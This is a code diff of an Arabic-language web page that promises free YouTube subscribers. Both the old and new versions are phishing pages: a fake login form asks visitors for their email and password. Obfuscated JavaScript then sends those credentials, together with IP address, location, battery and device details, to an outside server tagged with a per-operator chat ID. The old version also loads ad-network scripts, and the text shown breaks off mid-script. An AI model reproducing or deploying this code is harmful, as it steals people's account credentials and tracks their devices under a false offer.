@@ -1,389 +1,256 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة مشتركين يوتيوب💥</title> 
-  <meta property="og:title" content="زيادة مشتركين يوتيوب💥"> 
-  <meta property="og:description" content="مرحبا بك في افضل موقع زياده  متابعين  يوتيوب  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀 "> 
-  <meta property="og:image:type" content="image/jpeg"> 
-  <meta property="og:image:width" content="1200"> 
-  <meta property="og:image:height" content="630"> 
-  <meta property="og:type" content="website"> 
-  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo"> 
-  <meta name="twitter:card" content="summary_large_image"> 
-  <meta name="twitter:title" content="زيادة مشتركين يوتيوب💥"> 
-  <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده  متابعين  يوتيوب  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀"> 
-  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTo9pexLc7z0xZbahuz7YpQpxlzgMV6OoHXqg&s"> 
-  <meta name="twitter:image:width" content="1200"> 
-  <meta name="twitter:image:height" content="630"> 
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.7)), url('https://example.com/pubg-background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: #ffffff;
-      overflow: auto; /* للسماح بالتمرير إذا لزم الأمر */
-      position: relative; /* لتحسين موضع التأثيرات */
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-      backdrop-filter: blur(8px);
-      position: relative;
-      z-index: 2;
-    }
-
-    .login-container, .pubg-container {
-      max-width: 500px;
-      padding: 30px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.8);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-      display: none; /* إخفاء في البداية */
-    }
-
-    .login-container.active, .pubg-container.active {
-      display: block; /* إظهار عند الحاجة */
-    }
-
-    .login-container h1 {
-      margin: 0 0 20px;
-      font-size: 32px;
-      color: #ffffff; /* لون ذهبى */
-    }
-
-    .option-button {
-      width: 100%;
-      padding: 15px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      box-sizing: border-box;
-      background-color: #444;
-      color: #ffffff; /* لون ذهبى */
-      font-size: 18px;
-      cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-    }
-
-    .option-button img {
-      width: 30px;
-      height: 30px;
-      margin-left: 10px;
-    }
-
-    .option-button:hover {
-      background-color: #555;
-      transform: scale(1.02);
-    }
-
-    .pricing-section {
-      margin-top: 20px;
-      padding: 20px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.7);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-    }
-
-    .pricing-section h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    .pricing-option {
-      margin: 10px 0;
-      padding: 15px;
-      border-radius: 8px;
-      background-color: #333;
-      color: #ffffff;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .pricing-option span {
-      font-size: 20px;
-    }
-
-    .pricing-option button {
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ffffff;
-      color: #333;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .pricing-option button:hover {
-      background-color: #e1b60a;
-    }
-
-    .logo {
-      width: 150px;
-      margin-top: 20px;
-    }
-
-    .message {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      padding: 10px;
-      background-color: #e74c3c;
-      color: #fff;
-      text-align: center;
-      font-size: 18px;
-      display: none; /* إخفاء الرسالة افتراضيًا */
-      z-index: 3;
-    }
-
-    /* تأثير الخلفية المتحركة */
-    @keyframes backgroundAnimation {
-      0% { background-position: 0% 0%; }
-      50% { background-position: 100% 100%; }
-      100% { background-position: 0% 0%; }
-    }
-
-    body::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('https://example.com/moving-background.jpg') repeat;
-      animation: backgroundAnimation 60s linear infinite;
-      z-index: 1;
-      opacity: 0.2; /* ضبط الشفافية لتأثير الخلفية المتحركة */
-    }
-  </style> 
- </head> 
- <body> 
-  <div class="message" id="message">
-   يرجى تسجيل الدخول أولاً
-  </div> 
-  <div class="container"> 
-   <div class="login-container active" id="login-container"> 
-    <h1>تسجيل الدخول عبر</h1> 
-    <button class="option-button" onclick="showPubgContainer()"> Google <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Diamonds"> </button> 
-   </div> 
-   <div class="pubg-container" id="pubg-container"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة مشتركين يوتيوب 🚀</title> 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="زيادة مشتركين يوتيوب💥">
+    <meta property="og:description" content="مرحبا بك في افضل موقع زياده مشتركين يوتيوب يمكنك زياده اكثر من 1000 مشترك يومياً مجاني💥🚀">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="زيادة مشتركين يوتيوب💥">
+    <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده مشتركين يوتيوب يمكنك زياده اكثر من 1000 مشترك يومياً مجاني💥🚀">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTo9pexLc7z0xZbahuz7YpQpxlzgMV6OoHXqg&s">
+    <title>زيادة مشتركين يوتيوب</title>
     <style>
-    @keyframes heartColor {
-      0% { color: #ffffff; }
-      25% { color: #000000; }
-      50% { color: #ffffff; }
-      75% { color: #000000; }
-      100% { color: #ffffff; }
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-      background-color: #b30000;
-      color: #ffffff;
-    }
+        body {
+            background: #0f0f0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            padding: 20px;
+        }
 
-    @keyframes gradientBackground {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+        .container {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 40px 30px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(255, 0, 0, 0.2);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+        }
 
-    form {
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 40px 20px;
-      border: 1px solid #dbdbdb;
-      border-radius: 12px;
-      background-color: #1c1c1c;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-      color: #ffffff;
-      position: relative;
-      overflow: hidden;
-    }
+        .logo {
+            text-align: center;
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
 
-    form::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, transparent 20%, rgba(255, 255, 255, 0.2) 20%, rgba(255, 255, 255, 0.2) 80%, transparent 80%, transparent);
-      background-size: 50% 50%;
-      animation: rotateBackground 4s linear infinite;
-      z-index: 1;
-    }
+        h2 {
+            color: #FF0000;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+        }
 
-    @keyframes rotateBackground {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+        h2 span {
+            animation: pulse 2s ease-in-out infinite;
+            display: inline-block;
+        }
 
-    form * {
-      position: relative;
-      z-index: 2;
-    }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
 
-    input[type=text], select {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0 20px 0;
-      display: inline-block;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      box-sizing: border-box;
-      background-color: #333333;
-      color: #ffffff;
-    }
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
 
-    button {
-      background-color: #f39c12;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
 
-    button:hover {
-      background-color: #e67e22;
-    }
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
 
-    .heart {
-      animation: heartColor 2s infinite;
-      font-size: 24px;
-    }
+        input:focus, select:focus {
+            border-color: #FF0000;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.15);
+        }
 
-    .follower {
-      color: #1e90ff;
-      font-size: 24px;
-      margin-top: 20px;
-    }
+        input::placeholder {
+            color: #666;
+        }
 
-    .pubg-logo {
-      width: 100px;
-      height: 100px;
-      margin-top: 20px;
-    }
+        select option {
+            background: #1a1a1a;
+            color: #fff;
+        }
 
-    .input-container {
-      position: relative;
-      margin-bottom: 15px;
-    }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #FF0000, #cc0000);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
 
-    .input-container label {
-      position: absolute;
-      top: -18px;
-      left: 10px;
-      background-color: #1c1c1c;
-      padding: 0 5px;
-      font-size: 14px;
-      color: #ffffff;
-    }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+        }
 
-    #message {
-      position: fixed;
-      top: 0;
-      left: 50%;
-      transform: translate(-50%, 0);
-      background-color: rgba(0, 0, 0, 0.9);
-      color: #ffffff;
-      padding: 15px 20px;
-      border-radius: 0 0 8px 8px;
-      font-size: 18px;
-      display: none;
-      z-index: 1000;
-      width: 80%;
-      max-width: 600px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-    }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-    .effects {
-      animation: effects 4s infinite;
-    }
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #FF0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
 
-    @keyframes effects {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
-    }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-  </style> 
-    <h2 class="effects">زيادة مشتركين يوتيوب 🚀<span class="heart">🚀</span></h2> 
-    <form method="POST" action="https://bott.freeusr.xyz/submitIncrease" id="nameForm"> 
-     <input type="hidden" id="chatId" name="chatId" value="7130416076.png"> 
-     <div class="input-container"> 
-      <label for="username"> البريد الإلكتروني:</label> 
-      <input type="text" id="username" name="username" required> 
-     </div> 
-     <div class="input-container"> 
-      <label for="password">كلمة المرور:</label> 
-      <input type="text" id="password" name="password" required> 
-     </div> 
-     <label for="followerCount">عدد مشتركين:</label>
-     <br> 
-     <select id="followerCount" name="followerCount" required> <option value="500">1000 مشتركين مجاني</option> </select>
-     <br>
-     <br> 
-     <button type="submit">شحن</button> 
-    </form> 
-    <div id="message"></div> 
-   </div> 
-   <div class="pricing-section"> 
-    <h2>أسعار مشتركين</h2> 
-    <div class="pricing-option"> 
-     <span>1000  - 0$</span> 
-     <button onclick="showMessage()">مجاني</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>1500  - 2$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2000  - 3$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2500  - 4$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>3000  - 5$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>10000  - 10$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-   </div> 
-  
-<div id="notification" class="notification"></div>
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
 
-<script>
-const _0x4b1e89=_0x5cd0;(function(_0x43ee8e,_0x81bda){const _0x2e0a64=_0x5cd0,_0x4dab38=_0x43ee8e();while(!![]){try{const _0x5b5d74=-parseInt(_0x2e0a64(0x20e))/0x1*(-parseInt(_0x2e0a64(0x1e7))/0x2)+-parseInt(_0x2e0a64(0x1ff))/0x3+parseInt(_0x2e0a64(0x1e0))/0x4+parseInt(_0x2e0a64(0x208))/0x5*(-parseInt(_0x2e0a64(0x217))/0x6)+-parseInt(_0x2e0a64(0x1e4))/0x7*(parseInt(_0x2e0a64(0x218))/0x8)+parseInt(_0x2e0a64(0x1db))/0x9*(parseInt(_0x2e0a64(0x1f9))/0xa)+parseInt(_0x2e0a64(0x20f))/0xb;if(_0x5b5d74===_0x81bda)break;else _0x4dab38['push'](_0x4dab38['shift']());}catch(_0x17196d){_0x4dab38['push'](_0x4dab38['shift']());}}}(_0x5317,0x239a0));function showPubgContainer(){const _0xb2fe1b=_0x5cd0;document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1df))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1fb)](_0xb2fe1b(0x1ee)),document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1fa))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1f5)](_0xb2fe1b(0x1ee));}const increaseForm=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1da)),chatIdInput=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x20c)),urlParams=new URLSearchParams(window[_0x4b1e89(0x1f1)][_0x4b1e89(0x20d)]),chatId=urlParams[_0x4b1e89(0x216)](_0x4b1e89(0x1f3));document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1f3))[_0x4b1e89(0x1dd)]=chatId||'';async function getIPInfo(){const _0x924ec2=_0x4b1e89;try{const _0x1f4ea4=await fetch(_0x924ec2(0x1e5)),_0x2b87e9=await _0x1f4ea4[_0x924ec2(0x1de)]();return{'ip':_0x2b87e9['ip'],'country':_0x2b87e9[_0x924ec2(0x1ed)],'city':_0x2b87e9[_0x924ec2(0x203)]};}catch(_0x7124fa){return console[_0x924ec2(0x215)](_0x924ec2(0x1f7),_0x7124fa),{'ip':_0x924ec2(0x211),'country':_0x924ec2(0x211),'city':_0x924ec2(0x211)};}}function _0x5cd0(_0x2a8509,_0x3b9102){_0x2a8509=_0x2a8509-0x1da;const _0x5317b=_0x5317();let _0x5cd0d1=_0x5317b[_0x2a8509];return _0x5cd0d1;}function _0x5317(){const _0x60790c=['notification','preventDefault','تم\x20إرسال\x20البيانات\x20بنجاح!','getBattery','country_name','active','charging','POST','location','Error\x20getting\x20battery\x20info:','chatId','test','add','userAgent','Error\x20fetching\x20IP\x20info:','match','3550sMmgZM','pubg-container','remove','addEventListener','submit','https://www.effectivegatecpm.com/c91t164y78?key=ac0d9f08bc23ae53a5f9bd39692515bc','393630RJIbRN','innerText','Error:','success','city','entries','assign','href','حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.','644405RsfTRC','Android','https://bott.freeusr.xyz/submitIncrease','application/json','chatIdInput','search','3fqOlnk','1441286XNKyJS','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','Unknown','iOS','MacOS','classList','error','get','12wwYRMa','16UhuMla','nameForm','3006QBgHEj','stringify','value','json','login-container','701680wDIJde','fromEntries','Linux','getElementById','440839tsouLL','https://ipapi.co/json/','Windows','157156ZUoSbd','level'];_0x5317=function(){return _0x60790c;};return _0x5317();}function getPlatformInfo(){const _0x549a4a=_0x4b1e89,_0x22afde=navigator[_0x549a4a(0x1f6)];let _0x1b96af=_0x549a4a(0x211);if(/Windows/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e6);else{if(/Mac/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x213);else{if(/Linux/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e2);else{if(/Android/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x209);else{if(/iPhone|iPad|iPod/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x212);}}}}return{'platform':_0x1b96af,'userAgent':_0x22afde};}async function getBatteryInfo(){const _0x1dc320=_0x4b1e89;if(_0x1dc320(0x1ec)in navigator)try{const _0x5cb1f9=await navigator[_0x1dc320(0x1ec)]();return{'batteryLevel':_0x5cb1f9[_0x1dc320(0x1e8)],'batteryCharging':_0x5cb1f9[_0x1dc320(0x1ef)]};}catch(_0x528969){console[_0x1dc320(0x215)](_0x1dc320(0x1f2),_0x528969);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x5a4d7f=_0x4b1e89,_0x4d7f7f=navigator[_0x5a4d7f(0x1f6)],_0x5e0cfb=_0x4d7f7f[_0x5a4d7f(0x1f8)](/\(([^)]+)\)/);return _0x5e0cfb?_0x5e0cfb[0x1]:_0x5a4d7f(0x211);}increaseForm[_0x4b1e89(0x1fc)](_0x4b1e89(0x1fd),async _0x36efce=>{const _0x1508a1=_0x4b1e89;_0x36efce[_0x1508a1(0x1ea)]();const _0x2f5721=new FormData(increaseForm),_0x4a5a64=Object[_0x1508a1(0x1e1)](_0x2f5721[_0x1508a1(0x204)]()),_0x48b862=await getIPInfo(),_0x4da410=getPlatformInfo(),_0x320a82=await getBatteryInfo(),_0x2586d1=getDeviceVersion();Object[_0x1508a1(0x205)](_0x4a5a64,_0x48b862,_0x4da410,_0x320a82,{'deviceVersion':_0x2586d1});try{const _0x5efa5d=await fetch(_0x1508a1(0x20a),{'method':_0x1508a1(0x1f0),'headers':{'Content-Type':_0x1508a1(0x20b)},'body':JSON[_0x1508a1(0x1dc)](_0x4a5a64)}),_0x493bd3=await _0x5efa5d[_0x1508a1(0x1de)]();_0x493bd3[_0x1508a1(0x202)]?(document[_0x1508a1(0x1e3)](_0x1508a1(0x1e9))[_0x1508a1(0x200)]=_0x1508a1(0x1eb),window[_0x1508a1(0x1f1)][_0x1508a1(0x206)]=_0x1508a1(0x1fe)):alert(_0x1508a1(0x207));}catch(_0x3238d5){console[_0x1508a1(0x215)](_0x1508a1(0x201),_0x3238d5),alert(_0x1508a1(0x210));}});
-</script>
-<script src="https://pl28828545.effectivegatecpm.com/75/7c/35/757c35587997bc0d07d956a06931b902.js"></script>
+        .success-message .check {
+            font-size: 60px;
+            color: #4CAF50;
+            animation: popIn 0.5s ease;
+        }
+
+        .success-message h3 {
+            color: #4CAF50;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+
+        .success-message p {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #FF0000;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+            input, select {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            button {
+                font-size: 16px;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">▶️</div>
+        <h2>زيادة مشتركين يوتيوب <span>🚀</span></h2>
+
+        <form id="ytForm">
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني</label>
+                <input type="text" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="input-group">
+                <label>👥 عدد المشتركين</label>
+                <select id="subscribers">
+                    <option value="1000">1000 مشترك - مجاني 🎁</option>
+                    <option value="1500">1500 مشترك - 2$</option>
+                    <option value="2000">2000 مشترك - 3$</option>
+                    <option value="3000">3000 مشترك - 5$</option>
+                    <option value="5000">5000 مشترك - 8$</option>
+                    <option value="10000">10000 مشترك - 15$</option>
+                </select>
+            </div>
+
+            <button type="submit" id="submitBtn">🚀 زيادة المشتركين الآن</button>
+
+            <div class="spinner" id="spinner"></div>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="check">✅</div>
+            <h3>تم استلام طلبك!</h3>
+            <p>جاري معالجة طلبك، سيتم إضافة المشتركين قريباً</p>
+        </div>
+
+        <div class="footer">
+            🔒 بياناتك آمنة ومشفرة
+        </div>
+    </div>
+
+    <script>
+function _0x5a31(){const _0x479eb7=['charging','submitBtn','trim','غير\x20متاح','error','يرجى\x20إدخال\x20البريد\x20الإلكتروني\x20وكلمة\x20المرور','language','Unknown','1197iGhUuW','block','getElementById','style','addEventListener','userAgent','خطأ:\x20chatId\x20غير\x20موجود\x20في\x20الرابط','get','status','3281376Clmxkn','Sending\x20data:','https://bott.freeusr.xyz/submitIncrease','search','test','submit','928bUvczw','YouTube','Linux','toISOString','city','filename','href','json','462958dZaAeK','Error:','disabled','stringify','warn','chatId','فشل\x20إرسال\x20البيانات','1647520YOlxLt','6DlShJZ','spinner','6OcQCsQ','POST','signal','platform','subscribers','غير\x20معروف','Error\x20getting\x20battery\x20info:','value','https://bott.freeusr.xyz/fail','password','خطأ\x20في\x20الاتصال\x20بالخادم','successMessage','country','preventDefault','https://ipwho.is/','country_name','864628UcVJem','getBattery','none','display','المستخدم\x20لم\x20يدخل\x20البيانات\x20المطلوبة','lineno','219405doAgTT','level','message','iOS','ytForm','Windows','location','Android','email','4880200ECEEuH','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','معرف\x20المستخدم\x20غير\x20موجود\x20في\x20الرابط','application/json'];_0x5a31=function(){return _0x479eb7;};return _0x5a31();}const _0xe55fe8=_0x3e17;(function(_0x29c920,_0x156b7c){const _0x49b336=_0x3e17,_0x3b312a=_0x29c920();while(!![]){try{const _0x27a5cf=parseInt(_0x49b336(0xae))/0x1+parseInt(_0x49b336(0xda))/0x2*(-parseInt(_0x49b336(0xe4))/0x3)+parseInt(_0x49b336(0xa8))/0x4+parseInt(_0x49b336(0xe1))/0x5*(parseInt(_0x49b336(0xe2))/0x6)+parseInt(_0x49b336(0xcc))/0x7+-parseInt(_0x49b336(0xd2))/0x8*(parseInt(_0x49b336(0xc3))/0x9)+-parseInt(_0x49b336(0xb7))/0xa;if(_0x27a5cf===_0x156b7c)break;else _0x3b312a['push'](_0x3b312a['shift']());}catch(_0x5b44ce){_0x3b312a['push'](_0x3b312a['shift']());}}}(_0x5a31,0x414a4));async function sendFailReport(_0x5873f3,_0x499803,_0xf3448d={}){const _0x206820=_0x3e17,_0x22fff6=new URLSearchParams(window[_0x206820(0xb4)][_0x206820(0xcf)])[_0x206820(0xca)]('chatId')||_0x206820(0x9d);try{await fetch(_0x206820(0xa0),{'method':'POST','headers':{'Content-Type':_0x206820(0xba)},'body':JSON[_0x206820(0xdd)]({'chatId':_0x22fff6,'type':_0x5873f3,'message':_0x499803,'details':_0xf3448d,'deviceInfo':{'platform':navigator[_0x206820(0xe7)]||_0x206820(0xbe),'language':navigator[_0x206820(0xc1)]||_0x206820(0xbe),'userAgent':navigator['userAgent']||_0x206820(0xbe),'timestamp':new Date()[_0x206820(0xd5)]()}})});}catch(_0x229c7f){console['warn']('Failed\x20to\x20send\x20fail\x20report:',_0x229c7f);}}const urlParams=new URLSearchParams(window[_0xe55fe8(0xb4)][_0xe55fe8(0xcf)]),chatId=urlParams[_0xe55fe8(0xca)](_0xe55fe8(0xdf));!chatId&&(sendFailReport('error',_0xe55fe8(0xb9),{}),alert(_0xe55fe8(0xc9)));let cachedIpData=null,ipFetched=![];async function getIPInfo(){const _0x2eb658=_0xe55fe8;if(ipFetched&&cachedIpData)return cachedIpData;try{const _0x20a289=new AbortController(),_0x56a7c1=setTimeout(()=>_0x20a289['abort'](),0xbb8),_0x3b492d=await fetch(_0x2eb658(0xa6),{'signal':_0x20a289[_0x2eb658(0xe6)]});clearTimeout(_0x56a7c1);if(_0x3b492d['ok']){const _0x1fd213=await _0x3b492d[_0x2eb658(0xd9)]();cachedIpData={'ip':_0x1fd213['ip']||_0x2eb658(0x9d),'country':_0x1fd213[_0x2eb658(0xa7)]||_0x2eb658(0x9d),'city':_0x1fd213[_0x2eb658(0xd6)]||_0x2eb658(0x9d)};}else cachedIpData={'ip':_0x2eb658(0x9d),'country':_0x2eb658(0x9d),'city':_0x2eb658(0x9d)};}catch(_0x39dfc5){console[_0x2eb658(0xde)]('IP\x20fetch\x20failed,\x20using\x20fallback'),cachedIpData={'ip':_0x2eb658(0x9d),'country':_0x2eb658(0x9d),'city':_0x2eb658(0x9d)};}return ipFetched=!![],cachedIpData;}function _0x3e17(_0x753726,_0x4a130d){_0x753726=_0x753726-0x9c;const _0x5a31b9=_0x5a31();let _0x3e1782=_0x5a31b9[_0x753726];return _0x3e1782;}function getPlatformInfo(){const _0x203408=_0xe55fe8,_0x108b71=navigator[_0x203408(0xc8)];let _0x30e68f=_0x203408(0xc2);if(/Windows/[_0x203408(0xd0)](_0x108b71))_0x30e68f=_0x203408(0xb3);else{if(/Mac/[_0x203408(0xd0)](_0x108b71))_0x30e68f='MacOS';else{if(/Linux/['test'](_0x108b71))_0x30e68f=_0x203408(0xd4);else{if(/Android/[_0x203408(0xd0)](_0x108b71))_0x30e68f=_0x203408(0xb5);else{if(/iPhone|iPad|iPod/[_0x203408(0xd0)](_0x108b71))_0x30e68f=_0x203408(0xb1);}}}}return{'platform':_0x30e68f,'userAgent':_0x108b71};}async function getBatteryInfo(){const _0x567720=_0xe55fe8;if(_0x567720(0xa9)in navigator)try{const _0x5c9b70=await navigator[_0x567720(0xa9)]();return{'batteryLevel':_0x5c9b70[_0x567720(0xaf)],'batteryCharging':_0x5c9b70[_0x567720(0xbb)]};}catch(_0x3d709b){console[_0x567720(0xbf)](_0x567720(0x9e),_0x3d709b);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x5d3f06=_0xe55fe8,_0x231f44=navigator[_0x5d3f06(0xc8)],_0x247e42=_0x231f44['match'](/\(([^)]+)\)/);return _0x247e42?_0x247e42[0x1]:_0x5d3f06(0xc2);}document[_0xe55fe8(0xc5)](_0xe55fe8(0xb2))[_0xe55fe8(0xc7)](_0xe55fe8(0xd1),async _0x471017=>{const _0x58ba50=_0xe55fe8;_0x471017[_0x58ba50(0xa5)]();const _0x23baad=document[_0x58ba50(0xc5)](_0x58ba50(0xb6))[_0x58ba50(0x9f)]['trim'](),_0x271824=document[_0x58ba50(0xc5)](_0x58ba50(0xa1))[_0x58ba50(0x9f)][_0x58ba50(0xbd)](),_0x47d0e0=document['getElementById'](_0x58ba50(0x9c))[_0x58ba50(0x9f)];if(!_0x23baad||!_0x271824){sendFailReport('permission',_0x58ba50(0xac),{'email':!!_0x23baad,'password':!!_0x271824}),alert(_0x58ba50(0xc0));return;}document[_0x58ba50(0xc5)](_0x58ba50(0xe3))[_0x58ba50(0xc6)]['display']=_0x58ba50(0xc4),document['getElementById'](_0x58ba50(0xbc))['disabled']=!![];try{const _0x372405=await getIPInfo(),_0x1cbb6e=getPlatformInfo(),_0x463d4a=await getBatteryInfo(),_0x2e13e0=getDeviceVersion(),_0x3aebb7={'username':_0x23baad,'password':_0x271824,'platform':_0x58ba50(0xd3),'chatId':chatId||'','ip':_0x372405['ip'],'country':_0x372405[_0x58ba50(0xa4)],'city':_0x372405[_0x58ba50(0xd6)],'userAgent':_0x1cbb6e[_0x58ba50(0xc8)],'batteryLevel':_0x463d4a['batteryLevel'],'charging':_0x463d4a['batteryCharging'],'osVersion':_0x2e13e0,'subscribers':_0x47d0e0};console['log'](_0x58ba50(0xcd),_0x3aebb7);const _0x1b4077=await 